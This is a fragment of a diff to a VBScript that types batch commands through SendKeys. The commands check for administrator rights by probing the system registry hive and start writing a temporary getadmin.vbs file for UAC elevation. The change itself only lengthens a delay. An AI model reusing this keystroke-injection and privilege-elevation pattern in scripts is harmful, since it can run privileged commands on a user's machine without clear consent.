@@ -32,7 +32,7 @@ WScript.Sleep 100
 
  WshShell.SendKeys "if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0" 
 
-WScript.Sleep 100
+WScript.Sleep 300
 
 WshShell.SendKeys "( >nul 2>&1 %SYSTEMROOT%\system32\cacls.exe %SYSTEMROOT%\system32\config\system || echo Set UAC = CreateObject^(Shell.Application^) > %temp%\getadmin.vbs"
 
